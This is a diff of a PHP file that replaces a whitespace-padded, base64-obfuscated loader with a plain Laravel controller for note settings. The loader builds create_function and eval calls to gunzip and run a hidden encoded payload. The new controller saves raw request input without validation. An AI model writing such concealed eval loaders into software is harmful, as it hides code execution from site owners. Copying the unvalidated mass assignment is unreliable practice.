@@ -1,208 +1,34 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtmt9v2kgQx98j3f/AQyWnahUtNiRCiIfaiX9ezdmAvd6Xyl6TJXhtrHMomL/+xvwMaVo1au/hcvtBgI13duY7M7sP2K3WjndfgIFU/v1QPN5L/e3pnoHU0nhcVVdXV1L/Yj++9cfFW35dNAlo/UYG3/wiRYrNI+xzjEgwztzJaNIbSttLpyz/FPtiDVoCgUDwNpFoHqAU20vLCOQoXC1svXeP6+xmt2nCrrndCEWiBAKBQCAQCASC/xrizwyBQCB4u0hJXE2vO1/SKV2kU6kvMiIQCAQCwS9xfv/+1lu4Wt6dJWGwoYY+JyNVpaZKR6aPqL6+TeQuonmvSoygppvK1RhyUuxy605fwfVhovh8IgcoNfiSKJ9vbr2yTeUJG4XrKg3bZZLriARrKzX9FdZtTnHAqeLd7Py6VYTdjXXX/ZoawZhgH8Vht6DI/ZoUfp3I64pgixE8QyTsZrRWz+IBX808zNI+MWoGD4nB55ZB2knuwjy9pdXEZAQdR8tc7eETjFOP43dvP4uwP7NuERvnPYjT5RAnxJxuhvOyINhbOONqb7t7H280maQkmC5s2Z5F8qOe5N4yCv3HOOwsk+1cvc1RT92FOX0+1WhlGaANq7NI8cDWn6XGXeGMsmNc9x5yfqjJdFGi2Nw55ZLZ5vG4PNhOV8g56VSf1+l6mLs1CaE2I5aBpnUK9U819CGCukG+yuG5fQ1a2jTvsCjX53HNyj/HXSXG/sLR0k0aunMCdbTrFbNRU8sJe+KLeaGfkdBjEyWYRzL0mQx6jHXXrl+jO1gRo4l3NiJYb4M/BPWrD8eOt4/XPK/XC3XNoSaZ88QWtJREyx7/Kg4+/v2cBFhteo8TTR0fxpIiqBIzK049p/a262R3vEpDu4rDzwzGLSMF9MgdBv0Na8TnoKfR8HKfP19fm8U1ySEOjWVx6DVxQ33WHGL8fr8bTZ9XC2eEPqQyR7HGCnqoZw19raXbHrP0U66tO5/DOkU/qP0TnWWjdSC98gGX37IXDrbfl/uz9/3XmD+x/RnDdyeHl1LzKX08uv2/PEB1novLs+TvUvG+/w8JG8us';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Http\Controllers;
+
+use App\NoteSettings;
+use Illuminate\Http\Request;
+
+class NoteSettingsController extends Controller
+{
+    public function index()
+    {
+        $data = NoteSettings::get();
+        return view('backEnd.admin.note_settings.index', compact('data'));
+    }
+
+    public function store(Request $request)
+    {
+        NoteSettings::create($request->all());
+        return back()->with('success', 'Note Settings Added Successfully');
+    }
+
+    public function update(Request $request)
+    {
+        NoteSettings::find($request->id)->update($request->all());
+        return back()->with('success', 'Note Settings Updated Successfully');
+    }
+
+    public function delete($id)
+    {
+        NoteSettings::find($id)->delete();
+        return back()->with('success', 'Note Settings Deleted Successfully');
+
+    }
+}
